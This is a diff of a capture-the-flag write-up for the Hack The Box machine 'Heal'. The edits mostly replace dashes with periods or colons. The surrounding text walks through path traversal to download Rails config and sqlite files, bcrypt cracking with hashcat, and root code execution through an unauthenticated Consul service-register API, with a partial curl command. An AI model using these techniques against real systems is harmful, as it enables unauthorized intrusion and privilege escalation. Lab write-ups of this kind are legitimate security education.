@@ -52,7 +52,7 @@ $ nmap -T5 -A api.heal.htb
 |_http-title: Ruby on Rails 7.1.4
 :::
 
-`heal.htb` is the public site, `api.heal.htb` is the Rails backend. Register an account, build a resume, hit **Export as PDF** — the browser downloads `api.heal.htb/download?filename=<uuid>.pdf` behind the scenes.
+`heal.htb` is the public site, `api.heal.htb` is the Rails backend. Register an account, build a resume, hit **Export as PDF**. The browser downloads `api.heal.htb/download?filename=<uuid>.pdf` behind the scenes.
 
 ::: img src="../assets/img/writeups/htb-heal/01-nmap.png" caption="Only SSH + HTTP on the main host; api.heal.htb is a separate vhost running Rails"
 
@@ -73,7 +73,7 @@ root:x:0:0:root:/root:/bin/bash
 ralph:x:1000:1000:,,,:/home/ralph:/bin/bash
 :::
 
-Rails config sits at `config/database.yml` — dev uses sqlite.
+Rails config sits at `config/database.yml`. Dev uses sqlite.
 
 ::: terminal title="burp · GET /download" lang="bash"
 GET /download?filename=../../config/database.yml
@@ -87,7 +87,7 @@ GET /download?filename=../../storage/development.sqlite3
 
 ::: stage n=3 label="CREDS" title="Bcrypt ralph → `[REDACTED]`."
 
-Open the dumped DB in SQLiteStudio. One row in the `users` table — {red:ralph@heal.htb} / `$2a$12$...` bcrypt / `is_admin = 1`.
+Open the dumped DB in SQLiteStudio. One row in the `users` table contains {red:ralph@heal.htb} / `$2a$12$...` bcrypt / `is_admin = 1`.
 
 ::: img src="../assets/img/writeups/htb-heal/03-sqlite-dump.png" caption="ralph@heal.htb — bcrypt hash + is_admin = 1 in the dev sqlite"
 
@@ -96,7 +96,7 @@ $ hashcat -m 3200 -a 0 hash.txt rockyou.txt
 $2a$12$[BCRYPT-HASH] : [REDACTED]
 :::
 
-SSH as ralph is blocked. Admin panel is on a second vhost — `take-survey.heal.htb/index.php/admin/authentication/sa/login`. Login lands on a {cool:LimeSurvey 6.6.4} admin.
+SSH as ralph is blocked. The admin panel is on a second vhost: `take-survey.heal.htb/index.php/admin/authentication/sa/login`. Login lands on a {cool:LimeSurvey 6.6.4} admin.
 
 :::
 
@@ -135,7 +135,7 @@ uid=33(www-data) gid=33(www-data) groups=33(www-data)
 
 ::: stage n=5 label="ROOT" title="Consul is bound to localhost. `service/register` runs as root."
 
-Rifling through `/var/www/limesurvey/application/config/config.php` leaks PostgreSQL creds — but Postgres permissions aren't enough for user pivot. `ss -tuln` is the real find:
+Rifling through `/var/www/limesurvey/application/config/config.php` leaks PostgreSQL creds, but Postgres permissions aren't enough for user pivot. `ss -tuln` is the real find:
 
 ::: terminal title="shell · www-data@heal" lang="bash"
 $ ss -tuln
@@ -145,7 +145,7 @@ LISTEN  127.0.0.1:8302
 LISTEN  127.0.0.1:8600
 :::
 
-{cool:8500} is Consul. With no ACL tokens, anyone can `PUT /v1/agent/service/register` with a `Check` block that runs an arbitrary command — {red:as root}.
+{cool:8500} is Consul. With no ACL tokens, anyone can `PUT /v1/agent/service/register` with a `Check` block that runs an arbitrary command {red:as root}.
 
 ::: terminal title="shell · www-data@heal" lang="bash"
 $ curl -X PUT http://127.0.0.1:8500/v1/agent/service/register -d '{
@@ -171,7 +171,7 @@ root@heal:/# cat /home/ron/user.txt
 ::: img src="../assets/img/writeups/htb-heal/05-consul-root.png" caption="Consul service/register runs the Check command as root — shell on the second listener"
 
 ::: note title="WHY IT WORKED"
-Consul's `Check` block is designed to execute commands for health probes — the service will run them on the schedule you specify. When the HTTP API is unauthenticated on a host where Consul runs as root, every unauthenticated caller gets arbitrary code execution as root.
+Consul's `Check` block is designed to execute commands for health probes. The service will run them on the schedule you specify. When the HTTP API is unauthenticated on a host where Consul runs as root, every unauthenticated caller gets arbitrary code execution as root.
 :::
 
 :::
